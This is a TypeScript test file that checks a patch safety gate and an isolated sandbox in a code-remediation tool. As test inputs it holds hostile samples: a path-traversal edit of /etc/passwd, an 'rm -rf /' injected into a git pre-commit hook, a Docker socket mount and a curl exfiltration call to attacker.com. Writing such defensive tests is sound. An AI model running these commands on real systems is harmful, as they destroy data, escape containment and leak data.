import { describe, it, expect } from "vitest";
import { createFinding } from "../src/evidence.js";
import { StructuredEdit } from "../src/fixes/types.js";
import { PatchSafetyGate } from "../src/sandbox/patch-safety-gate.js";
import { IsolatedSandbox } from "../src/sandbox/isolated-sandbox.js";
import { VerificationLadderRunner } from "../src/sandbox/verification-ladder.js";
import { generatePRDescription } from "../src/fixes/pr-publisher.js";

describe("Phase 5: Safe Remediation & Verification Sandbox", () => {
  const sandbox = new IsolatedSandbox();
  const ladderRunner = new VerificationLadderRunner(sandbox);

  const targetFinding = createFinding({
    ruleId: "idor.owner-column.v1",
    title: "Insecure Direct Object Reference (IDOR) - Missing Ownership Filter",
    severity: "high",
    confidenceTier: "proven",
    file: "app/api/orders/route.ts",
    lineRange: { startLine: 10, endLine: 12 },
    evidenceChain: [],
    unresolvedSteps: [],
    explanation: "Missing user_id ownership check",
    fingerprint: "idor.owner-column.v1:app/api/orders/route.ts:id:orders",
  });

  it("should reject path traversal and .git write attempts in PatchSafetyGate (L0 failure)", () => {
    const maliciousEdits: StructuredEdit[] = [
      {
        targetFile: "../../../etc/passwd",
        targetContent: "root",
        replacementContent: "hacked",
      },
    ];
    const diff = "--- a/../../../etc/passwd\n+++ b/../../../etc/passwd\n+hacked";

    const res = PatchSafetyGate.validatePatch(maliciousEdits, diff, ["app/api/orders/route.ts"]);

    expect(res.valid).toBe(false);
    expect(res.reason).toContain("Absolute path or traversal detected");
  });

  it("should reject .git directory and hooks modification attempts in PatchSafetyGate (L0 failure)", () => {
    const gitEdits: StructuredEdit[] = [
      {
        targetFile: ".git/hooks/pre-commit",
        targetContent: "#!/bin/sh",
        replacementContent: "#!/bin/sh\nrm -rf /",
      },
    ];
    const diff = "--- a/.git/hooks/pre-commit\n+++ b/.git/hooks/pre-commit\n+rm -rf /";

    const res = PatchSafetyGate.validatePatch(gitEdits, diff, [".git/hooks/pre-commit"]);

    expect(res.valid).toBe(false);
    expect(res.reason).toContain("forbidden .git directory");
  });

  it("should reject @ts-ignore and eslint-disable suppression comments in PatchSafetyGate", () => {
    const edits: StructuredEdit[] = [
      {
        targetFile: "app/api/orders/route.ts",
        targetContent: "const data = await db.query()",
        replacementContent: "// @ts-ignore\nconst data = await db.query()",
      },
    ];
    const diff = "--- a/app/api/orders/route.ts\n+++ b/app/api/orders/route.ts\n+// @ts-ignore";

    const res = PatchSafetyGate.validatePatch(edits, diff, ["app/api/orders/route.ts"]);

    expect(res.valid).toBe(false);
    expect(res.reason).toContain("rule suppression comment");
  });

  it("should block host Docker socket access attempts inside IsolatedSandbox", async () => {
    const res = await sandbox.executeCommand(process.cwd(), "docker run -v /var/run/docker.sock:/var/run/docker.sock alpine");

    expect(res.success).toBe(false);
    expect(res.output).toContain("Access to host Docker socket is strictly prohibited");
  });

  it("should block outbound network access attempts during verification phase", async () => {
    const res = await sandbox.executeCommand(process.cwd(), "curl http://attacker.com/exfiltrate", {
      networkPhase: "none",
    });

    expect(res.success).toBe(false);
    expect(res.output).toContain("Outbound network connection blocked");
  });

  it("should mask secrets in raw sandbox execution logs", async () => {
    const res = await sandbox.executeCommand(process.cwd(), "node -e \"console.log('sk_live_12345678901234567890')\"");

    expect(res.output).not.toContain("sk_live_12345678901234567890");
    expect(res.output).toContain("[REDACTED_SECRET");
  });

  it("should execute complete Verification Ladder (L0-L5) and format PR description cleanly", async () => {
    const filesMap = new Map<string, string>([
      [
        "app/api/orders/route.ts",
        `
export async function GET(req: Request, { params }: { params: { id: string } }) {
  const session = await getServerSession();
  const { data } = await supabase.from("orders").select("*").eq("id", params.id).eq("user_id", session.user.id);
  return Response.json(data);
}
        `,
      ],
    ]);

    const edits: StructuredEdit[] = [
      {
        targetFile: "app/api/orders/route.ts",
        targetContent: ".eq(\"id\", params.id)",
        replacementContent: ".eq(\"id\", params.id).eq(\"user_id\", session.user.id)",
      },
    ];

    const diff = `--- a/app/api/orders/route.ts\n+++ b/app/api/orders/route.ts\n+.eq("user_id", session.user.id)`;

    const ladderRes = await ladderRunner.runVerificationLadder(
      process.cwd(),
      filesMap,
      targetFinding,
      edits,
      diff,
      ["app/api/orders/route.ts"]
    );

    expect(ladderRes.L0_patchSafety).toBe("passed");
    expect(ladderRes.L1_securityRescan).toBe("passed");
    expect(ladderRes.overallResult).toBe("passed");
    expect(ladderRes.patchHash.length).toBe(16);

    const prDescription = generatePRDescription(targetFinding, {
      kind: "automated",
      ruleId: "idor.owner-column.v1",
      targetFile: "app/api/orders/route.ts",
      edits,
      diff,
      riskLevel: "low",
      blastRadius: { affectedFiles: ["app/api/orders/route.ts"], callersAffected: [], importedByModules: [], riskLevel: "low" },
      proofLabel: "Proven by policy simulation",
      verificationReport: {
        passed: true,
        checksRun: ["L0", "L1", "L2"],
        summaryText: ladderRes.summaryMessage,
      },
    });

    expect(prDescription).toContain("Verification Ladder Status");
    expect(prDescription).toContain("L0 — Patch Safety");
    expect(prDescription).toContain("L1 — Security Re-scan");
  });
});
